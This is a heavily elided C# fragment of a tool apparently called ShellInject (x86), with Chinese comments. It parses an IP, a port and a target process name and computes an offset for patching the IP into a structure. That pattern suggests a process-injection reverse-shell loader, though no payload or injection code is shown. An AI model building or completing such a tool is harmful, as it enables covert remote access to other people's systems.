...
namespace ShellInject
{
    class Program
    {
        ...
        {
            Console.WriteLine("[*] ShellInject (x86) started");

            // 参数解析：IP 端口 目标进程名
            if (args.Length < 3)
            {
                Console.WriteLine("[-] Usage: ShellInject.exe <IP> <Port> <TargetProcess>");
                return;
            }
            ...
            int ipOffset   = pos - 5;   // x86 特殊偏移（IP 在结构中的位置）
